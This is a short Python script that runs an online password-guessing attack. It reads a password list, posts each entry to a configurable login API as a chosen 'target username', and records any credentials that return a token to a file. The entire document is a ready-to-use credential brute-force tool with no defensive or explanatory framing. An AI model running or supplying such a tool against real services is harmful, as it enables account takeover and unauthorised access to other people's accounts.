import requests

# ===== CONFIGURATION =====
LOGIN_URL = "https://example.com/api/login"
USERNAME = "username_here"  # Change this to target username
PASSWORD_FILE = "passwords.txt"
OUTPUT_FILE = "valid.txt"

HEADERS = {
    "Content-Type": "application/json"
}

PAYLOAD_TEMPLATE = {
    "username": "",
    "password": ""
}
# =========================

with open(PASSWORD_FILE) as f:
    for line in f:
        password = line.strip()
        
        if not password:
            continue
        
        payload = PAYLOAD_TEMPLATE.copy()
        payload["username"] = USERNAME
        payload["password"] = password
        
        resp = requests.post(LOGIN_URL, json=payload, headers=HEADERS)
        
        if resp.status_code == 200 and resp.json().get("token"):
            print(f"✅ VALID: {USERNAME}:{password}")
            with open(OUTPUT_FILE, "a") as out:
                out.write(f"{USERNAME}:{password}\n")
            break
        else:
            print(f"❌ INVALID PASSWORD: {password}")
